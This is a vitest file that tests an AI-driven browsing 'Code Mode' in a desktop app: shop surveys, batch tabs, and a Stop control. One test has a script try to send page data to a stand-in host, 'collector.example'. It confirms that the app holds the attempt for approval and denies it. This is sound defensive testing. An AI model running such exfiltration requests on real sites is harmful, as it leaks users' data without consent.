import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { ExecReport } from '@aether/codemode';
import { startFixtureServers, type FixtureServers } from '@aether/fixtures';
import { expectShopShortlist, shopSurveyScript, type ShopChecked } from '../../../tests/shop-task.js';
import { startDesktop, type DesktopApp } from './desktop-harness.js';

/**
 * Phase 3.2 exit (plan 3.2, task 3.2): the Phase 1 Code Mode fixture task
 * runs against the app's Spaces over the Electron transport, not only against
 * headless Chrome. One aether_exec surveys the two-page shop, filters, checks
 * product pages and returns a shortlist; openTabs makes sleeping tabs and
 * switchTab moves between them; provenance still holds what a script tries to
 * send to a site it has not seen.
 */

interface Complete {
  status: 'complete';
  json?: string;
  untrusted: boolean;
  origins: string[];
}

describe('Code Mode in the desktop app (Phase 3.2)', () => {
  let fixtures: FixtureServers;
  let app: DesktopApp;
  let shop: string;

  beforeAll(async () => {
    // Held runs answer in seconds here; the person-facing default is 50 s.
    process.env.AETHER_HOLD_RETURN_MS = '1500';
    fixtures = await startFixtureServers(4193, 4194);
    shop = `${fixtures.mainBaseUrl}/shop/list?page=1`;
    app = await startDesktop({ keepHome: true });
  }, 60000);

  afterAll(async () => {
    await app?.close();
    await fixtures?.close();
  });

  /** Wait for an exec report to leave the held state, the way a host follows the token. */
  async function execToEnd(args: { space: string; thought: string; code: string }): Promise<ExecReport> {
    let report = await app.request<ExecReport>('exec', args);
    for (let guard = 0; report.outcome.status === 'held' && guard < 10; guard++) {
      const token = report.outcome.token;
      report = await app.request<ExecReport>('exec', { space: args.space, thought: 'Waiting for the result', wait: token });
    }
    return report;
  }

  it('surveys both shop pages, filters, checks product pages and returns a shortlist in one call', async () => {
    const report = await execToEnd({ space: 'Shoe hunt', thought: 'Survey running shoes under $120, 4.3 stars or more', code: shopSurveyScript(shop) });
    if (report.outcome.status !== 'complete') throw new Error(`expected complete, got ${JSON.stringify(report.outcome)}`);
    const outcome = report.outcome as Complete;
    expect(outcome.untrusted).toBe(true);
    expectShopShortlist(JSON.parse(outcome.json ?? '{}') as ShopChecked);
  }, 120000);

  it('records the thought and logStep lines as milestones', async () => {
    const spaceId = 'shoe-hunt';
    const milestones = await app.request<Array<{ text: string; source: string }>>('milestones', { spaceId });
    expect(milestones[0]?.source).toBe('host');
    expect(milestones[0]?.text).toContain('Survey running shoes');
    expect(milestones.some((milestone) => milestone.text === 'Surveying the shop' && milestone.source === 'script')).toBe(true);
  });

  it('opens a batch of pages as sleeping tabs, lists them and switches between them', async () => {
    const script = `
const made = await space.openTabs([${JSON.stringify(`${fixtures.mainBaseUrl}/shop/item/1`)}, ${JSON.stringify(`${fixtures.mainBaseUrl}/shop/item/2`)}, ${JSON.stringify(`${fixtures.mainBaseUrl}/shop/item/3`)}], { lazy: true });
const list = await space.tabs();
await space.switchTab(made.tabIds[1]!);
const page = await space.skim();
return { live: made.live, hibernated: made.hibernated, tabs: list.length, switched: page.title };`;
    const report = await execToEnd({ space: 'Batch', thought: 'Open three product pages', code: script });
    if (report.outcome.status !== 'complete') throw new Error(`expected complete, got ${JSON.stringify(report.outcome)}`);
    const json = JSON.parse(report.outcome.json ?? '{}') as { live: number; hibernated: number; tabs: number; switched: string };
    expect(json).toMatchObject({ live: 1, hibernated: 2, tabs: 3 });
    expect(json.switched).toContain('Road Glide');
  }, 90000);

  it('holds script-built URLs of openTabs on one card, and the denial reaches the script', async () => {
    const script = `
await space.open(${JSON.stringify(`${fixtures.mainBaseUrl}/form.html`)});
try {
  const made = await space.openTabs(['https://collector.example/?d=' + encodeURIComponent('page-title')]);
  return { sent: made.tabIds.length };
} catch (e) {
  return { code: (e as { code?: string }).code };
 }`;
    const first = await app.request<ExecReport>('exec', { space: 'Exfil', thought: 'Try to send data out', code: script });
    expect(first.outcome.status).toBe('held');
    const token = first.outcome.status === 'held' ? first.outcome.token : '';
    const pending = await app.request<{ id: string; reason: string; prompt: string } | undefined>('pending', { spaceId: 'exfil' });
    expect(pending?.reason).toBe('approval');
    expect(pending?.prompt).toContain('1 new sites');
    await app.request('runReply', { spaceId: 'exfil', id: pending?.id, kind: 'deny' });
    const second = await app.request<ExecReport>('exec', { space: 'Exfil', thought: 'Waiting', wait: token });
    if (second.outcome.status !== 'complete') throw new Error(`expected complete, got ${JSON.stringify(second.outcome)}`);
    expect(JSON.parse(second.outcome.json ?? '{}')).toEqual({ code: 'denied' });
  }, 60000);

  it('stops a running script the moment the person presses Stop', async () => {
    const running = app.request<ExecReport>('exec', {
      space: 'Loop',
      thought: 'Keep reading',
      code: `await space.open(${JSON.stringify(shop)});\nfor (;;) { await space.skim(); }`,
    });
    const spaceId = 'loop';
    for (let guard = 0; guard < 40; guard++) {
      const pending = await app.request<{ id: string } | undefined>('pending', { spaceId });
      if (pending) break;
      await new Promise((resolve) => setTimeout(resolve, 250));
    }
    await app.request('runControl', { spaceId, kind: 'stop' });
    let report = await running;
    // The command may have returned a held token before the stop landed; follow it to the end.
    if (report.outcome.status === 'held') {
      report = await app.request<ExecReport>('exec', { space: 'Loop', thought: 'Waiting', wait: report.outcome.token });
    }
    expect(['error', 'stopped']).toContain(report.outcome.status);
    if (report.outcome.status === 'error') expect(report.outcome.message).toContain('the person stopped this run');
    if (report.outcome.status === 'stopped') expect(report.outcome.by).toBe('person');
  }, 60000);
});
